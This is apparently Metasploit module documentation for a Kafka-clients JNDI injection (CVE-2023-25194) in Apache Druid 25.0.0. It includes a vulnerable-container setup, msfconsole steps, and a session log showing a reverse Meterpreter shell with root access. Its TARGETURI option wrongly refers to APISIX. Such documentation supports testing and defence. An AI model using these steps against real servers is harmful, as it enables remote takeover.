## Vulnerable Application

Apache Kafka is an open-source distributed event streaming platform that is used for real-time data streaming and processing.
Kafka clients are a set of Java libraries that allow you to produce and consume messages from Apache Kafka.

In the version prior to 3.3.2, there is a JNDI injection issue in the Apache Kafka clients if an attacker is able to set the
`sasl.jaas.config` property for any of the connector's Kafka clients to `com.sun.security.auth.module.JndiLoginModule`.
It will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can
use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization
of untrusted data (or) RCE vulnerability when there are gadgets in the classpath.

As Apache Druid depends on kafka-clients to connect to one of its data sources, making it out of the box vulnerable if using any
affected version.

The below docker compose file can be used to build a vulnerable container.

```yaml
version: '2'
services:
 web:
   image: vulhub/apache-druid:25.0.0
   ports:
    - "8888:8888"
```


## Verification Steps

Metasploit:

1. `./msfconsole`
1. `use exploit/multi/http/apache_druid_cve_2023_25194`
1. `set rhosts <rhost>`
1. `set target <target>`
1. `set srvhost <srvhost>`
1. `set SSL <true or false>`
1. `run`

## Scenarios

### Apache Kafka-clients 3.3.1 on Druid version 25.0.0

```
msf6 exploit(multi/http/apache_druid_cve_2023_25194) > exploit 

[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to trigger the jndi callback...
[+] The target is vulnerable.
[+] Delivering the serialized Java object to execute the payload...
[*] Client sent unbind request
[*] Server stopped.
[*] Meterpreter session 1 opened (172.18.0.1:4444 -> 172.18.0.2:42908) at 2023-06-22 13:33:01 +0200

meterpreter > sysinfo
Computer     : 72fc9c4031a6
OS           : Linux 6.1.11-1-MANJARO #1 SMP PREEMPT_DYNAMIC Thu Feb  9 14:03:23 UTC 2023
Architecture : x64
Meterpreter  : python/linux
meterpreter > shell
Process 1112 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
find /opt/druid/extensions/druid-kafka-indexing-service/ -iname "kafka-clients*"
/opt/druid/extensions/druid-kafka-indexing-service/kafka-clients-3.3.1.jar
^C
Terminate channel 1? [y/N]  y
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: User exit
```

## Options

### TARGETURI (required)

The path to the APISIX routes controller (Default: `/`).
